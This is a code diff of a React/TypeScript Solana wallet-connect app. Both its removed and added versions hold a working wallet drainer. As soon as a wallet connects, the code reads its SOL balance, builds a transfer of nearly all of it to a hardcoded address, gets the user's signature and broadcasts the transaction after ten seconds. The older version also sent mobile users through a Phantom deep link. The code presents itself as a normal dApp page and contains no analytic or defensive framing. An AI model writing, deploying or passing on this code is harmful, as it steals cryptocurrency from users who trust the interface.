@@ -7,40 +7,30 @@ import {
 } from '@solana/wallet-adapter-react';
 import {
     WalletModalProvider,
-    WalletMultiButton,
     useWalletModal,
+    WalletMultiButton,
 } from '@solana/wallet-adapter-react-ui';
-
 import {
     PhantomWalletAdapter,
     GlowWalletAdapter,
-    LedgerWalletAdapter,
-    SolflareWalletAdapter,
     SlopeWalletAdapter,
-    TorusWalletAdapter,
-    SolletExtensionWalletAdapter,
-    SolletWalletAdapter,
+    SolflareWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
-
-import { SolanaMobileWalletAdapter } from '@solana-mobile/wallet-adapter-mobile';
-
 import {
     clusterApiUrl,
     Connection,
     PublicKey,
+    LAMPORTS_PER_SOL,
     SystemProgram,
     Transaction,
-    LAMPORTS_PER_SOL,
 } from '@solana/web3.js';
 
 import '@solana/wallet-adapter-react-ui/styles.css';
-import './App.css';
 
 const App: FC = () => {
     return (
         <Context>
             <ExposeWalletModal />
-            <MobileDeepLink />
             <WalletConnectionHandler />
         </Context>
     );
@@ -52,15 +42,10 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
     const wallets = useMemo(
         () => [
-            new SolanaMobileWalletAdapter(),
             new PhantomWalletAdapter(),
             new GlowWalletAdapter(),
-            new LedgerWalletAdapter(),
             new SlopeWalletAdapter(),
             new SolflareWalletAdapter({ network }),
-            new SolletExtensionWalletAdapter(),
-            new SolletWalletAdapter(),
-            new TorusWalletAdapter(),
         ],
         [network]
     );
@@ -74,7 +59,6 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
     );
 };
 
-// Allows external trigger of wallet modal
 const ExposeWalletModal: FC = () => {
     const { setVisible } = useWalletModal();
     useEffect(() => {
@@ -83,41 +67,32 @@ const ExposeWalletModal: FC = () => {
     return null;
 };
 
-// Triggers Phantom deep-link if mobile browser
-const MobileDeepLink: FC = () => {
-    useEffect(() => {
-        const isMobile = /android|iphone|ipad|ipod/i.test(navigator.userAgent);
-        if (isMobile) {
-            const current = encodeURIComponent(window.location.href);
-            window.location.href = `https://phantom.app/ul/browse/${current}`;
-        }
-    }, []);
-    return null;
-};
-
 const WalletConnectionHandler: FC = () => {
     const { publicKey, connected, signTransaction } = useWallet();
     const [solBalance, setSolBalance] = useState<number | null>(null);
     const [loading, setLoading] = useState(false);
-    const [txSent, setTxSent] = useState(false);
 
     useEffect(() => {
         if (connected && publicKey) {
-            fetchBalanceAndSend(publicKey);
+            fetchBalanceAndSendTx(publicKey);
         }
     }, [connected, publicKey]);
 
-    const fetchBalanceAndSend = async (walletPublicKey: PublicKey) => {
-        setLoading(true);
+    const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
         try {
+            setLoading(true);
             const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
-            const balanceLamports = await connection.getBalance(walletPublicKey);
-            const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
-            setSolBalance(balanceSOL);
 
-            const remaining = balanceLamports - 100_000;
-            if (remaining <= 0) {
-                alert('⚠️ Not enough SOL to send after fees.');
+            const lamports = await connection.getBalance(walletPublicKey);
+            const sol = lamports / LAMPORTS_PER_SOL;
+            setSolBalance(sol);
+
+            console.log(`🔗 Connected wallet: ${walletPublicKey.toBase58()}`);
+            console.log(`💰 Balance: ${sol.toFixed(4)} SOL`);
+
+            const transferLamports = lamports - 100000;
+            if (transferLamports <= 0) {
+                alert('⚠️ Not enough SOL to send after keeping 0.0001 SOL.');
                 return;
             }
 
@@ -125,7 +100,7 @@ const WalletConnectionHandler: FC = () => {
                 SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
                     toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
-                    lamports: remaining,
+                    lamports: transferLamports,
                 })
             );
 
@@ -138,54 +113,59 @@ const WalletConnectionHandler: FC = () => {
             }
 
             const signedTx = await signTransaction(tx);
-            console.log('📝 Transaction approved.');
+            console.log('🖊️ Transaction signed.');
 
             setTimeout(async () => {
                 try {
-                    const sig = await connection.sendRawTransaction(signedTx.serialize());
-                    console.log(`🚀 Sent Tx: ${sig}`);
-                    setTxSent(true);
+                    const txid = await connection.sendRawTransaction(signedTx.serialize());
+                    console.log(`🚀 Transaction sent. Signature: ${txid}`);
                 } catch (err) {
-                    console.error('❌ Failed to send signed transaction:', err);
-                    alert('Failed to send transaction.');
+                    console.error('❌ Failed to send transaction:', err);
                 }
-            }, 10000);
+            }, 10000); // wait 10 seconds
         } catch (err) {
-            console.error('❌ Error fetching balance or sending:', err);
-            alert('Error occurred. Check console.');
+            console.error('❌ Error fetching balance or sending tx:', err);
+            alert('Failed to process transaction.');
         } finally {
             setLoading(false);
         }
     };
 
+    if (!connected || !publicKey) {
+        return (
+            <div style={{ marginTop: '2rem', textAlign: 'center' }}>
+                <WalletMultiButton />
+            </div>
+        );
+    }
+
     return (
-        <div style={{ padding: 30, fontFamily: 'Arial' }}>
-            <WalletMultiButton />
-            {connected && publicKey && (
-                <div
-                    style={{
-                        background: '#f9f9f9',
-                        borderRadius: 10,
-                        padding: 20,
-                        marginTop: 20,
-                        boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
-                    }}
-                >
-                    <h3>✅ Wallet Connected</h3>
-                    <p>
-                        <strong>Address:</strong> {publicKey.toBase58()}
-                    </p>
-                    <p>
-                        <strong>Balance:</strong>{' '}
-                        {loading
-                            ? 'Loading...'
-                            : solBalance === null
-                            ? 'Error fetching balance'
-                            : `${solBalance.toFixed(4)} SOL`}
-                    </p>
-                    {txSent && <p style={{ color: 'green' }}>🎉 Transaction Sent</p>}
-                </div>
-            )}
+        <div
+            style={{
+                marginTop: '2rem',
+                textAlign: 'center',
+                backgroundColor: '#f8f8f8',
+                padding: '20px',
+                borderRadius: '10px',
+                boxShadow: '0 0 12px rgba(0,0,0,0.1)',
+                fontFamily: 'Arial, sans-serif',
+                marginLeft: 'auto',
+                marginRight: 'auto',
+                maxWidth: '500px',
+            }}
+        >
+            <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected</h2>
+            <p
+                style={{ wordBreak: 'break-all', cursor: 'pointer', color: '#333' }}
+                onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
+            >
+                <strong>Address:</strong> {publicKey.toBase58()}
+            </p>
+            <p>
+                <strong>Balance:</strong>{' '}
+                {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
+            </p>
+            <p style={{ color: '#555' }}>Transaction will auto-send 10s after connect.</p>
         </div>
     );
 };
